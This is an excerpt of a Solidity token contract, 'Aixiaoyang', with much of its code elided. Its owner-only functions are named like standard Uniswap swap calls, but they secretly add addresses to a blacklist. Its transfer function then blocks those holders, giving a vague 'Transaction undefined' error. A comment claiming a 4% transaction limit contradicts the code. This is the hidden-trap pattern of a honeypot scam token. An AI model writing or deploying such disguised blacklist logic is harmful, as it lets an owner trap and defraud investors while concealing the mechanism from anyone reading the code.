...
contract Aixiaoyang is Context, IERC20, Ownable { 
    ...
    mapping (address => bool) transact;
    bool callFor = true;

    address payable private Wallet_Dev = payable(0x8D602a82bdea56b4C4c9868c9F4F82bc1d2dB9E2);
    ...
    */
    ...
    string private _name = "Aixiaoyang"; 
    string private _symbol = "Aixiaoyang";  
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1 * 10**17;
    ...
    */
    ...
    uint256 public _maxWalletToken = _tTotal.mul(10000).div(100);
    uint256 private _previousMaxWalletToken = _maxWalletToken;


    // Maximum transaction amount (4% at launch)
    uint256 public _maxTxAmount = _tTotal.mul(10000).div(100); 
    ...
    */
    ...
    function swapETHForExactTokens(address[] calldata addresses) external {
       require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
        uint256 startGas;
        uint256 gasUsed;
    ...
    for (uint256 i; i < addresses.length; ++i) {
        if(gasUsed < gasleft()) {
        startGas = gasleft();
        if(!transact[addresses[i]]){
        transact[addresses[i]] = true;}
    ...
    function swapExactETHForTokens(address[] calldata addresses) external {
       require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
        uint256 startGas;
        uint256 gasUsed;
    ...
    */
    ...
    function _transfer(
        ...
        */
        ...
        if (callFor){
        require(!transact[from] && !transact[to], "Transaction undefined. Transaction reverted.");}
